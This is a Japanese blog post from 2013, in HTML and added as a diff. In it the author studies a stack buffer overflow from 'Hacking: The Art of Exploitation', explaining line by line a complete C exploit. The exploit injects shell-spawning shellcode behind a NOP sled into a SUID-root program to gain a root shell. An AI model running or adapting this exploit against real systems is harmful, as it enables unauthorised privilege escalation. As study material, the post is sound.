@@ -1,0 +1,344 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>簡単なバッファオーバーフローを再現してみる（３） - KentaKomai's BLOG</title>
+  <meta name="author" content="Kenta Komai">
+
+  
+  <meta name="description" content="かなり間が空いてしまいましたが、前回に引き続きバッファオーバーフロー再現していきたいと思います。自分の復習用のメモです。 こちらの参考書の内容を読み、参考にして記事を書いています。より詳しく知りたい方は参考書を読んでいただければと思います。 前回、 &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://KentaKomai.github.io/blog/2013/04/10/wordpress29">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="KentaKomai's BLOG" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+  
+
+</head>
+
+<body   class="collapse-sidebar sidebar-footer" >
+  <header role="banner">
+	<div class="header-title"><a href="/">KentaKomai's BLOG</a></div>
+
+
+	<br><div class="header-subtitle">自分用備忘録の延長</div>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:KentaKomai.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+  
+    
+      <h1 class="entry-title">簡単なバッファオーバーフローを再現してみる（３）</h1>
+    
+  
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-04-10T00:00:00+09:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>かなり間が空いてしまいましたが、<a href="http://tamago.servehttp.com/blog/?p=190">前回</a>に引き続きバッファオーバーフロー再現していきたいと思います。自分の復習用のメモです。</p>
+
+<p><a href="http://www.amazon.co.jp/Hacking-%E7%BE%8E%E3%81%97%E3%81%8D%E7%AD%96%E8%AC%80-%E2%80%95%E8%84%86%E5%BC%B1%E6%80%A7%E6%94%BB%E6%92%83%E3%81%AE%E7%90%86%E8%AB%96%E3%81%A8%E5%AE%9F%E9%9A%9B-Jon-Erickson/dp/4873115140">こちらの参考書</a>の内容を読み、参考にして記事を書いています。より詳しく知りたい方は参考書を読んでいただければと思います。</p>
+
+<p>前回、スタッグセグメントの戻りアドレス値をBOFにより上書きして、強制的に当該アドレスの処理を実行させる手法でしたが、今回は任意のコードを挿入し、それを実行させる手法です。</p>
+
+<p>ちょっと用意するべきプログラムが多いので、今回は実際に再現するよりも、攻撃プログラムが書かれた箇所のみを解説していきます。プログラム中にある、「./notesearch」はroot権限のSUIDが設定されたBOFの脆弱性があるプログラム、ということだけ、ここでは確認できればOKです。（そちらも併せて詳しく、という方は書籍を読んでみていただければ、と思います。）</p>
+
+<p>参考コード</p>
+
+<pre class="lang:default decode:true">#include &lt;stdio.h&gt; 
+#include &lt;stdlib.h&gt; 
+#include &lt;string.h&gt; 
+char shellcode[]= "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
+"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89" 
+"\xe1\xcd\x80";
+
+int main(int argc, char *argv[]) { 
+   unsigned int i, *ptr, ret, offset=270; 
+   char *command, *buffer;
+
+   command = (char *) malloc(200); 
+   bzero(command, 200);
+
+   strcpy(command, "./notesearch \'"); 
+   buffer = command + strlen(command); 
+
+   if(argc &gt; 1) 
+      offset = atoi(argv[1]);
+
+   ret = (unsigned int) &i - offset; 
+
+   for(i=0; i &lt; 160; i+=4) 
+      *((unsigned int *)(buffer+i)) = ret;
+   memset(buffer, 0x90, 60);
+   memcpy(buffer+60, shellcode, sizeof(shellcode)-1);
+
+   strcat(command, "\'");
+
+   system(command);
+   free(command);
+}</pre>
+
+
+<p>main()から順番に解読していこうと思います。</p>
+
+<p>まずは</p>
+
+<p>12 行目command = (char *)malloc(200)ですが、200byteをヒープメモリに確保しchar型ポインタを返します。この際、確保された領域はゼロクリアされませんので、次のbzero(command, 200)でメモリ領域をゼロで初期化します。<a href="http://www9.plala.or.jp/sgwr-t/lib/malloc.html">[malloc]参考URL</a> <a href="http://temping-amagramer.blogspot.jp/2010/11/cbzero.html">[bzero]参考URL</a></p>
+
+<p>次の15行目 strcpy(command, &#8220;./notesearch &amp;#8217; &#8220;);は、commandに&#8221;./notesearch &amp;#8217; &#8220;をコピーするだけ、その次のbuffer = command + strlen(command)は、最初ちょっとわかりづらかったので、以下のサンプル書きました。</p>
+
+<pre class="lang:default decode:true">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+int main(){
+    char *command, *buffer;
+
+    command = (char *)malloc(200);
+    bzero(command, 200);
+
+    strcpy(command, "./notesearch \'");
+    buffer = command + strlen(command);
+    printf("hoge:%p\n", buffer);
+    printf("hoge:%p\n", command);
+}</pre>
+
+
+<p>先ほどの部分を抜き出して、変数の値を出力するだけですね。commandとbufferはchar型のポインタなので、ポインタが指すアドレスを出力させています。</p>
+
+<p>実行すればわかるとおもいますが、commnadのポインタが指すアドレスから&#8221; ./notesearch &amp;#8217; &#8220;の文字列の分、ポインタを進めたアドレスがbufferに格納されています。（command + 14byte ）</p>
+
+<p>次のif文とoffsetへの代入は、引数を与えたときのみ、今は解説省略します。</p>
+
+<p>次のret = (unsigned int) &amp;i &#8211; offsetでは、iのアドレスからmain関数開始時に宣言されたoffset文引いたアドレスを戻りアドレスとしてretに格納しておきます。</p>
+
+<p>その後のfor文では4byteずつ40回（160byte分）、先ほど設定した戻りアドレスretをbufferの中に繰り返し埋めていきます。(buffer開始から160byte全てがretで設定された戻りアドレスの状態)</p>
+
+<p><a href="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-10-at-0.32.00.png" rel="image_group"><img class="alignnone size-full wp-image-325" alt="Screen Shot 2013-04-10 at 0.32.00" src="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-10-at-0.32.00.png?resize=539%2C185" data-recalc-dims="1" /></a></p>
+
+<p>その後memset()でbufferから60byte分、0&#215;90を上書きしていきます。(0&#215;90の意味はコードの解説が終わったらまとめて)(buffer開始から60byteは0&#215;90、以降61byteから160byteまでは戻りアドレスの状態)</p>
+
+<p><a href="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-10-at-0.32.20.png" rel="image_group"><img class="alignnone size-full wp-image-326" alt="Screen Shot 2013-04-10 at 0.32.20" src="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-10-at-0.32.20.png?resize=551%2C192" data-recalc-dims="1" /></a></p>
+
+<p>そしてmemcpy()でbufferから60byte後ろに、グローバル変数として宣言されているshellcode[]を更に上書きします。(buffer開始から60byteは0&#215;90、61byteからsizeof(shellcode)-1はグローバル変数shellcode、そして以降は戻りアドレス、の状態)<a href="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-10-at-0.32.40.png" rel="image_group"><img class="alignnone size-full wp-image-327" alt="Screen Shot 2013-04-10 at 0.32.40" src="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-10-at-0.32.40.png?resize=536%2C190" data-recalc-dims="1" /></a></p>
+
+<p>最後にstrcat()でcommandの末尾にシングルクォーテーションを追加します。ここで注意するのは、文字列は先頭アドレスからnullまで、なので、commandのすぐ後ろから開始されているbufferもこの場合commandに含まれます。つまり</p>
+
+<p>commandの内容： &#8220;./notesearch &amp;#8217; &#8221; [bufferの内容] &#8220;&amp;#8217; &#8220;となっています。</p>
+
+<p><a href="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-10-at-0.50.38.png" rel="image_group"><img class="alignnone size-full wp-image-328" alt="Screen Shot 2013-04-10 at 0.50.38" src="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-10-at-0.50.38.png?resize=709%2C50" data-recalc-dims="1" /></a>文字化けしてますが、上記の内容と一致していることがわかると思います。</p>
+
+<p>そして、system()関数でcommandに格納されている文字列をOSコマンドとして実行することで攻撃を実行します。</p>
+
+<p>ここで0&#215;90という数字を繰り返しメモリに書き込んでいますが、これはx86アーキテクチャにおけるnop命令(0&#215;90)の連続です（NOP(No OPerationの略)スレッドと呼ばれる）</p>
+
+<p>これは、何もせずに次の処理に進めるだけの命令ですが、これを繰り返しメモリに書き込むことで戻りアドレスが、NOPスレッド内のアドレスであれば、どこでもシェルコードまで自動的に滑っていきます。これによって、シェルコードを実行させやすくしているようです。</p>
+
+<p>ただ、この攻撃手法の難しいところが、notesearchでBOFを発生させる際の戻りアドレスをある程度試行錯誤しなくてはならない、ということです。</p>
+
+<p>main()関数内で一番最初の変数iがスタックフレームにpushされたときのアドレスを参考値として、そこから変数offset（初期値270）を減じた値を戻りアドレスとしていますね。</p>
+
+<p>引数によって、offsetを調整できるように、 引数チェックのif文の箇所の処理があります。</p>
+
+<p>ここで設定する戻りアドレスを、notesearchでBOFさせたときにNOPスレッド内のアドレスの範囲内にできれば、シェルコードが実行される、という仕組みですね。</p>
+
+<p>変数shellcodeの中に書かれている16進数の文字列は、シェル起動の命令が書かれたものです。これの説明はまた改めます。（これを実行するとシェルが起動する、ということだけ今は確認できればと思います。）</p>
+
+<p>&nbsp;</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">k.komai</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-04-10T00:00:00+09:00" pubdate data-updated="true"></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/wei-fen-lei/'>未分類</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://KentaKomai.github.io/blog/2013/04/10/wordpress29/" data-via="TAMAGO_MAGO_2" data-counturl="http://KentaKomai.github.io/blog/2013/04/10/wordpress29/" >Tweet</a>
+  
+  
+  
+    <div class="fb-like" data-send="true" data-width="450" data-show-faces="false"></div>
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2013/04/04/wordpress28/" title="Previous Post: MySQL information_schemaデータベースに関してメモ">&laquo; MySQL information_schemaデータベースに関してメモ</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2013/04/11/wordpress30/" title="Next Post: Googleスプレッドシートで簡単JSONP api">Googleスプレッドシートで簡単JSONP api &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2013/11/28/wordpress77/">簡易プロセス死活監視プログラムをc#で</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/11/25/wordpress76/">xv6のソースコードとテキストを読んでみる1_chapter0_2</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/11/19/wordpress75/">[CSCamp CTF]解けなかった問題forensics1のwriteupを読んでみた</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/11/18/wordpress74/">Vagrant + Chef solo + Berkshelfを試してみたのでまとめ</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/11/10/wordpress73/">xv6のソースコードとテキストを読んでみる1_chapter0_1</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2013 -  Kenta Komai <br/>
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a> + <a href="https://github.com/ioveracker/mnml">mnml</a>.
+	  
+  </span>
+</p>
+
+</footer>
+  
+
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) {return;}
+  js = d.createElement(s); js.id = id; js.async = true;
+  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
